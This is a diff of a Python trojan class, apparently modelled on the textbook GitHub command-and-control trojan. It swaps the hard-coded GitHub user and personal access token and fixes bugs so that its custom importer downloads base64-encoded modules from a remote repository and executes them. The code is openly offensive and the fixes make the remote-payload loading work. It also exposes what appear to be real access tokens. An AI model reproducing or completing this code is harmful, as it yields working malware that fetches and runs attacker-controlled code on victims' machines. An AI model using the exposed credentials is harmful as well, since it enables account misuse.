@@ -11,8 +11,8 @@ from datetime import datetime
 
 
 def github_connect():
-    user = 'malwina1@poczta.int.pl'
-    token = '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'
+    user = 'PanPanB'
+    token = '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'
     sess = github3.login(token=token)
     return sess.repository(user, 'Trojanek')
 
@@ -54,7 +54,7 @@ class Trojan:
                         target=self.module_runner,
                         args=(task['module'],))
                 thread.start()
-                time.seep(random.randint(1, 10))
+                time.sleep(random.randint(1, 10))
 
             time.sleep(random.randint(30*60, 3*60*60))
 
@@ -65,7 +65,7 @@ class GitImporter:
     def find_module(self, fullname, path=None):
         print("[*] Proba pobrania %s" % fullname)
         self.repo = github_connect()
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)
+        new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
             return self
